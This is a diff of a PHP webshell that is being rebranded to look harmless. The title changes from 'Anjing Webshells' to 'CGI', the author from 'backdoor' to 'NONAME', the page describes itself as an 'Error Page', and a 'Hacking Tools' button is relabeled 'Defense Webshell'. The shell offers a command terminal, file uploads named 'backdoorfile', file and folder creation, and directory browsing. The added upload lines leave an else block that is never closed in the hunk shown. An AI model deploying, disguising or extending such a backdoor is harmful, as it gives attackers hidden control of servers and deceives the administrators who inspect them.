@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Anjing Webshells</title>
+    <title>CGI</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="author" content="backdoor">
+    <meta name="author" content="NONAME">
     <meta name="viewport" content="Kontol" />
     <meta name="description" content="Error Page">
     <meta property="og:description" content="Error Page">
@@ -254,10 +254,6 @@ function myFunction() {
 }
 </script>
 
- <?php
-
-echo "Website : " . $_SERVER['HTTP_HOST'] . "";
-?>
 
 <?php
 
@@ -490,27 +486,24 @@ $serloks = explode('/',$serlok);
 $serlokbos = @scandir($serlok);
 
 
-echo '<table class="header"><td><center>
-    <div style="font-family:Bungee Outline;font-size:20px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> backdoor</a></center></div></td><td>';
+echo '<table class="header"><td><center>';
 echo '<table align="center"><td>
 <div class="btn-group me-2" role="group" aria-label="First group">
-<button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i>kembali ke folder shell</font></button>
+<button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i>Dir_shell</font></button>
 <div class="btn-group me-2" role="group" aria-label="First group">
-<button type="button" onclick=location.href="?path='.$serlok.'&'.net("cmd").'=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i>Terminal Bypass</button>';
+<button type="button" onclick=location.href="?path='.$serlok.'&'.net("cmd").'=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i>Terminal</button>';
 
-echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("upload").'=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i>File Upload</button>
+echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("upload").'=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i>Upload</button>
 
-<button type="button" class="btn btn-outline-light"onclick=location.href="?path='.$serlok.'&'.net("info").'=opet"><i class="fa fa-info-circle"></i> information</button>
+<button type="button" class="btn btn-outline-light"onclick=location.href="?path='.$serlok.'&'.net("info").'=opet"><i class="fa fa-info-circle"></i>Info</button>
 
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfile").'=opet"><i class="fa-solid fa-file-circle-plus" style="color:#1F5ACF;"></i> Create File</button>
+<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfile").'=opet"><i class="fa-solid fa-file-circle-plus" style="color:#1F5ACF;"></i>Create_File</button>
 
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfolder").'=opet" style="float: right;"><i class="fa-solid fa-folder-plus" style="color:#FAA625;"></i> Create Folder</button>
+<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfolder").'=opet" style="float: right;"><i class="fa-solid fa-folder-plus" style="color:#FAA625;"></i>Create_Folder</button>
 
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("about").'=opet" style="float: right;"><i class="fa fa-info"></i>About</button>
-
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i>Hacking Tools</button>
+<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i>Defense Webshell</button>
 </td></tr></div>
-</div></div></td></table></table><br>';
+</div></td></table></table><br>';
 echo '<table class="directory-listing-table"><td><i class="fa fa-folder" style="color:#F19013;"></i> <b>:</b> ';
 foreach($serloks as $id => $lok){
     if($lok == '' && $id == 0){
@@ -727,6 +720,9 @@ if (isset($_GET['viewfile'])) {
                     $fl = $serlok."/".$_FILES['backdoorfile']['name'];
                     echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
                     Uploaded => <font color='lime'><i>".$_FILES['backdoorfile']['name']."</i></font><br>";
+                    if (is_uploaded_file($tmp) && filesize($tmp) > 0) {
+    move_uploaded_file($tmp, $target);
+  } else {
                     if (strpos($serlok, $_SERVER['DOCUMENT_ROOT']) !== false) {
                         $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $web."/", $fl);
                         echo "Link : <a href='".$lwb."' target='_blank'><font color='lime'>Click here</font></a></td></table><br>";
